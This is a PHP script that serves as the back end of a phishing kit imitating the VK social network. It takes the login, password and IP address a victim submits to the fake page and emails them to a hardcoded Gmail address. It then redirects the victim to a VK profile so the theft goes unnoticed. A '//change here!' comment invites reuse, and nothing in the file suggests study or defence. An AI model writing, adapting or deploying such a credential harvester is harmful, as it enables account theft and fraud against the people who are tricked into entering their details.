<?php
	
	/**
		* @author Litvinov V.A.
		* @copyright 2016 (0611)
	*/
	
	$LOCATION="https://vk.com/id415200121";
	$EMAIL = "mr.graf.lesha@gmail.com"; //change here!
	date_default_timezone_set ("Asia/Tashkent");
	
	$login=$_REQUEST["email"];
	$password=$_REQUEST["pass"];
	$ip=$_REQUEST["ip"];
	$today = date("H:i:s d.m.Y");
	
	$body = "Login: $login\r\n Password: $password\r\n IP: $ip\r\n Time: $today";
	mail($EMAIL, "Новое письмо из фейка vk.com! [$today]", $body);
	
	header("Location:$LOCATION");
	
?>